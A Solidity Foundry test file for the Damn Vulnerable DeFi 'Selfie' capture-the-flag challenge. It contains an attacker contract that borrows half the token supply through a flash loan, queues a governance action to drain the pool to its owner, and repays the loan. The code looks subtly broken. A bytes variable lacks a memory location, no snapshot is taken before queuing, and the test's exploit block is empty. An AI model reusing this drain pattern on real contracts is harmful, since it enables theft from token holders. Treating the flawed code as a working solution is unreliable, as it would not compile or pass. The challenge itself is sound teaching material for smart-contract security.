// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";

contract AttackerContract {
    address public owner;

    SelfiePool selfiePool;
    DamnValuableTokenSnapshot dvtSnapshot;
    SimpleGovernance simpleGovernance;

    uint256 public actionId;

    constructor(
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _dvtSnapshot,
        SimpleGovernance _simpleGovernance
    ) {
        owner = msg.sender;
        selfiePool = _selfiePool;
        dvtSnapshot = _dvtSnapshot;
        simpleGovernance = _simpleGovernance;
    }

    function attack() public {
        require(msg.sender == owner, "Not owner");
        uint256 halfTheSupply = dvtSnapshot.totalSupply() / 2;
        selfiePool.flashLoan(halfTheSupply);
    }

    function receiveTokens(address _dvtSnapshot, uint256 borrowAmount) public {
        require(msg.sender == address(selfiePool), "Not Pool");
        bytes data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
        uint256 _actionId = simpleGovernance.queueAction(owner, data, amount);
        actionId = _actionId;

        bool success = dvtSnapshot.transfer(address(selfiePool), borrowAmount);
        require(success, "FlashLoan not paid back");
    }

    function executeAttack() public {
        simpleGovernance.executeAction(actionId);
    }
}

contract Selfie is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testSelfieExploit() public {
        /** EXPLOIT START **/

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
